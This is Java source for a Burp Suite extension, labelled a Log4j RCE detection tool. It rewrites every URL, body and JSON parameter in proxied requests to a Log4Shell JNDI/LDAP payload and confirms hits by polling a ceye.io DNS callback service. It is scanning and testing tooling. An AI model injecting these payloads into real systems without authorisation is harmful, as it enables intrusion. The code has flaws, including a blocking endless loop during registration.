package burp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.http.HttpStatus;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class BurpExtender implements IBurpExtender, IHttpListener {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private String ExtenderName = "burp_ext demo";
    private String[] exts = {".js",".jpg",".png",".jpeg",".svg",".mp4",".css",".mp3",".ico",".woff",".woff2"};

    public Map<String,String> RRR = new HashMap<String,String>();

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        stdout.println("---- Security Team Log4jrce Detection Tool ----");
        stdout.println("---- Author:duke@aa.com ----");
        callbacks.setExtensionName(ExtenderName);
        callbacks.registerHttpListener(this);

        //循环监听dnslog结果
        while(true){
            try {
                for (Map.Entry<String, String> entry : RRR.entrySet()) {
                    String key = entry.getKey();
                    String value = entry.getValue();
                    if (key.length()>3) {
                        if (getRecord(key)) {
                            stdout.println("[+]"+"---url&parm-- " + value + " exists log4j_rce vul !!!");
                            RRR.remove(key);
                        }
                    }
                }
            }catch (Exception e){
                continue;
            }
        }
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if ((toolFlag == IBurpExtenderCallbacks.TOOL_PROXY) || (toolFlag == IBurpExtenderCallbacks.TOOL_REPEATER)) {
            if (messageIsRequest) { //对请求包进行处理
                IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);//messageInfo是请求/响应综合体
                URL url = analyzeRequest.getUrl();
                for (String ext : exts) { //特定结尾文件不处理
                    if (url.toString().endsWith(ext)) {
                        return;
                    }
                }
                List<IParameter> paraList = analyzeRequest.getParameters();//参数包括url、body、cookie、json、xml等格式参数

                for (IParameter para : paraList) {
                    UUID uuid = UUID.randomUUID();
                    String payload = uuid.toString().substring(0,13).replace("-",".");
                    String exp = "${jndi:ldap://"+payload+".t8xc48.ceye.io}";
                    RRR.put(payload,url+"&"+para.getName());
                    byte[] new_Request;
                    switch (para.getType()) {
                        case IParameter.PARAM_URL:
                        case IParameter.PARAM_BODY:
                            IParameter newPara = helpers.buildParameter(para.getName(), exp, para.getType()); //构造新的参数
                            new_Request = messageInfo.getRequest();
                            new_Request = helpers.updateParameter(new_Request, newPara); //构造新的请求包
                            messageInfo.setRequest(new_Request);//设置最终新的请求包
                            break;
                        case IParameter.PARAM_COOKIE:
                            break;
                        case IParameter.PARAM_JSON:
                            int bodyOffset = analyzeRequest.getBodyOffset();
                            byte[] byte_Request = messageInfo.getRequest();
                            String request = new String(byte_Request); //byte[] to String
                            String body = request.substring(bodyOffset).replace("\n","");//获取body内容

                            JSONObject jsonObject = JSON.parseObject(body); //解析json格式
                            for (String key:jsonObject.keySet()) {
                                jsonObject.put(key, exp); //替换exp
                            }

                            byte[] json_byte = jsonObject.toString().getBytes();
                            new_Request = helpers.buildHttpMessage(analyzeRequest.getHeaders(), json_byte);
                            //如果修改了header或者数修改了body，不能通过updateParameter，使用这个方法。
                            messageInfo.setRequest(new_Request);
//                            callbacks.makeHttpRequest(messageInfo.getHttpService(), new_Request);
                            break;
                    }

//                    Thread t = new Thread(() -> {
//                        if(getRecord(payload)){
//                            try {
//                                Thread.sleep(30);
//                            } catch (InterruptedException e) {
//                                throw new RuntimeException(e);
//                            }
//                            stdout.println(url+"?"+para.getName()+" exists-->log4j rce!!");
//                        }
//                    });
//                    t.start();
                }
            }
        }
    }

    public boolean getRecord(String record) {
        CloseableHttpClient closeableHttpClient = HttpClients.createDefault();
        RequestConfig requestConfig = RequestConfig.custom().setConnectTimeout(35000)// 连接主机服务超时时间
                .setConnectionRequestTimeout(35000)// 请求超时时间
                .setSocketTimeout(60000)// 数据读取超时时间
                .build();

        boolean res = false;

        try {
            String url = "http://api.ceye.io/v1/records?token=xx&type=dns&filter=" + record;
            HttpGet httpGet = new HttpGet(url);
            httpGet.setConfig(requestConfig);
            httpGet.setHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");
            CloseableHttpResponse httpResponse = closeableHttpClient.execute(httpGet);
            if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                String result = EntityUtils.toString(httpResponse.getEntity());// 返回json格式：
                JSONObject jsonObject = JSON.parseObject(result);
                if(jsonObject.getString("data").length()>10){
                    res = true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try { //关闭流并释放资源
                closeableHttpClient.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return res;
    }
}